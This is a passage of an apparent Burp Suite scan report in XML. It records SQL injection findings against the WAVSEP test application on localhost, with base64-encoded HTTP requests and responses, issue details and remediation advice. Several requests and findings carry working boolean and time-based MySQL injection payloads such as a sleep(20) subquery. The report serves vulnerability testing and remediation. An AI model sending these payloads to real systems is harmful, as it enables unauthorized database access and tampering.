      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KdGV4dHZhbHVlCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xMjY0NjExNzklMjBvciUyMDE1ODUlM2QxNTky]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8033838606941259776</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>50082422 or 8448=08448</b> and <b>23963803 or 5787=5790</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDA1MDA4MjQyMiUyMG9yJTIwODQ0OCUzZDA4NDQ4]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDAyMzk2MzgwMyUyMG9yJTIwNTc4NyUzZDU3OTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6996987257454880768</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
